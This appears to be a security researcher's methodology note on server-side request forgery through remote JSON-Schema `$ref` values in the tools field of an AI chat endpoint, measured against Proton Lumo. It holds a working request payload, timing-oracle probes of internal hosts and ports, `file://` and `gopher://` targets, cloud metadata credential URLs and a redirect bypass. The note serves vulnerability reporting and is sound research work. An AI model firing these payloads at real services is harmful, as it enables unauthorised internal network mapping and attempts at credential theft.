# AI tool-schema `$ref` SSRF — measured matrix and attribution discipline

Companion to `hunt-ssrf` § "Non-obvious sinks". Probe script: `scripts/ai_tool_ref_probe.py`.

Measured on **Proton Lumo** (`POST https://lumo.proton.me/api/ai/v1/chat/completions`), 2026-10-25:
14 payloads, 27 collaborator callbacks, 0 failures, 16 distinct server egress IPs. Unauthenticated.
Use this as the calibration baseline for any `chat/completions` endpoint you meet.

---

## 1. The sink

An [OI]-shaped chat endpoint accepts `tools`. If a tool's `parameters` is a remote JSON-Schema
reference, the gateway **resolves it server-side before invoking the model** — no inference cost,
no quota debit, no auth.

```json
{"model":"lumo-lite","max_tokens":4,"stream":false,
 "messages":[{"role":"user","content":"hi"}],
 "tools":[{"type":"function","function":{"name":"t","description":"d",
   "parameters":{"$ref":"https://<oast>/probe.json"}}}]}
```

Result: `200` + a normal completion, and the listener receives `GET /probe.json HTTP/2.0`.

### `description` is mandatory — and that is your negative control

Dropping `description` makes the body fail untagged-enum validation
(`data did not match any variant of untagged enum IncomingToolSpec`) and returns a **fast 500 with
zero callbacks**. That is the control that proves the fetch is caused by schema resolution rather
than by the error handler. Run it every time; without it a vendor can argue you only measured their
validator.

Same trap for other malformed shapes — `parameters:{"$schema":"https://…"}`, a `$ref` without
`description`, or a tool with no `parameters` at all all 500 fast without dialling. Do not count
those as "no fetch".

---

## 2. The oracle is SCHEMA validity, not JSON validity

Everything below was served with **HTTP 200** from the remote host, so the split is content-driven.
This discrimination is what makes the finding survive triage — "valid JSON vs garbage" is
dismissible as JSON parsing; a real schema-vs-invalid-schema split is not.

| remote document (all 200) | API | reading |
|---|---|---|
| `httpbin.org/json` (plain JSON object) | 200 | accepted as an empty/loose schema |
| base64 of `{"type":"object","properties":{"a":{"type":"string"}}}` | 200 | valid schema, accepted |
| base64 of `{"not":"a schema", "MARK":1}` | **500** | **invalid schema — `not` must hold a schema** |
| `/html` (200, text/html) | 500 | not JSON |
| `/xml` (200, XML) | 500 | not JSON |
| `/image/png` (200, binary) | 500 | not JSON |
| `/status/200`, `/status/204`, `/status/404`, `/status/500` | 500 | no usable body |

Serve the payload via `https://httpbin.org/base64/<urlsafe-b64>` so one host gives you both cases
with a controlled body.

### No content reflection — check it, then never write "read"

Put a unique marker (`ZZMARKER9931`) inside the fetched schema and grep the API response for it.
Marker absent → the primitive is **boolean only**. On Lumo the marker never appeared in either the
200 or the 500 branch. So the correct wording is "boolean content oracle", never "read internal
content".

If the marker *does* come back, you have escalated to full-read and severity changes — re-measure
before writing, and re-check whether the body appears in a debug/verbose error rather than the
normal path.

---

## 3. Dialled ≠ reachable ≠ readable — three separate buckets

### 3a. Dialled (attribution)

Compare the callback's source address against your own egress (`curl https://api.ipify.org`).
Lumo produced **two callbacks per payload** from **two different** addresses — read that as two
fetch paths in the stack, and record both rather than averaging.

Observed server egress (all distinct from the researcher's `104.28.226.245`):
`51.77.186.217 · 78.232.6.185 · 78.232.3.69 · 78.232.3.70 · 78.232.3.72 · 78.232.7.28 ·
141.94.47.194 · 95.133.254.65 · 51.159.163.252 · 51.159.167.216 · 51.159.191.160 · 62.210.237.96`

**Read the raw request headers at your listener.** Lumo sends only:

```
GET /poc.json HTTP/2.0
Host: <oast>
Accept: */*
```

No cookie, no `Authorization`, no service token ⇒ the ceiling is **network position (Medium)**, not
identity theft. If you see cookies/`Authorization`/a vendor service token at your listener, that is a
materially worse finding and belongs in the headline.

> A `Referer` pointing at your own redirect hop (`Referer: https://httpbin.org/redirect-to?url=…`)
> is the redirect host echoing, **not** the target leaking its origin. Do not misread it.

### 3b. Reachable (host/port oracle via timing)

Two runs each. Closed loopback ports reset fast; filtered ranges hang to the connect timeout.

| target in `$ref` | HTTP | time |
|---|---|---|
| `http://127.0.0.1:1/` (closed) | 500 | 1.80 s / 1.94 s |
| `http://127.0.0.1:{22,80,443,3000,5000,5432,6379,8000,8080,8888,9000,9200,10250,2375}` | 500 | 1.5–4.2 s (all reset) |
| `http://172.17.0.1:{80,2375,8080}` (docker bridge) | 500 | 1.6–2.1 s (all closed) |
| `http://10.255.255.1/` (RFC1918) | 500 | **31.72 s / 31.66 s** (filtered) |
| `http://10.0.0.1/` | 500 | 31.65 s (filtered) |
| `http://localhost:8080/` | 500 | 1.88 s |
| `http://payments-api.proton.me/` | 500 | 1.73 s (did not resolve) |
| `http://kubernetes.default.svc/` | 500 | 1.43 s (cluster DNS absent) |
| `file:///etc/passwd` | 500 | 1.53 s (scheme refused) |
| `gopher://127.0.0.1:6379/_PING` | 500 | 1.65 s (scheme refused) |

Reading: the fetcher runs in an isolated network namespace with no local listeners; RFC1918
gateways are filtered. The classifier works — that is a reportable internal host/port oracle — but
"reach" is not "read". Keep them in separate sentences.

### 3c. Readable (cloud metadata — the escalation that usually fails)

| endpoint | time | verdict |
|---|---|---|
| `169.254.170.2/v2/credentials` (AWS ECS) | 30.94 s | filtered |
| `169.254.170.23/v1/credentials` (AWS EKS pod identity) | 31.42 s | filtered |
| `169.254.169.254/latest/user-data` | 32.68 s | filtered |
| `169.254.169.254/latest/meta-data/iam/security-credentials/` | 1.54 s | fast fail |
| `169.254.169.254/latest/dynamic/instance-identity/document` | 31.28 s | filtered |
| `100.100.100.200` (Alibaba) | 32.07 s | filtered |
| `192.0.0.192` (Oracle) | 31.61 s | filtered |
| `metadata.google.internal/computeMetadata/v1/` | 2.37 s | did not resolve |

**Zero credentials retrieved.** When this is the outcome, report blind SSRF and say plainly that
metadata was attempted and filtered. Do not let an earlier draft imply credential theft.

---

## 4. Redirects are followed

`$ref = https://httpbin.org/redirect-to?url=https://<oast>/redir9.json` produced a request to
`/redir9.json`. So a first-hop allowlist is bypassable, and the hop must be in the report. Confirm
from the *final* path at your listener, not from the API status.

## 5. Confirm the primitive is one endpoint, not a class

Before writing, find a sibling endpoint with a different body shape and show it does **not** fetch:

- Lumo `POST /api/ai/v1/feedback` requires `Category`/`Sentiment`/`Environment`/`Body`, where `Body`
  must be a **string** (`Attribute Body should be of type string (array given)` when you send a
  schema object) — it never fetched, even with a `$ref` string embedded in the body. Enums:
  `Sentiment ∈ {Positive,Negative,Neutral}`, `Environment ∈ {Local,Remote}`.
- `stream:true` on `chat/completions` **does** trigger the same fetch — mention it, it widens the
  affected code path.

Stating the blast radius honestly ("confined to the completions endpoint") is worth more than a
speculative "all AI endpoints".

## 6. Anonymous quota is a separate bucket

`GET /api/ai/v1/limits` returns `{"lite":20,...}` unauthenticated and `{"lite":100,"max":20,"images":20}`
with a session. So an anon SSRF test says nothing about logged-in entitlement and vice versa — always
label which identity produced a reading, and note that this endpoint needs **no** auth to fetch `$ref`.

## 7. Severity ladder for this subclass

| you proved | write it as |
|---|---|
| callback only, no credential forwarding | Low/informational — usually not submittable alone |
| + internal host/port oracle (RST vs timeout) | Medium — network position, blind |
| + boolean schema oracle on internal URLs | Medium (argue High) |
| + internal content retrieved or metadata creds | High/Critical |
| + credentials in the forwarded request headers | High, lead with it |

Never upgrade on "it fetched" alone. The gap between Medium and Critical in this subclass is exactly
the readable bucket, and vendors check.
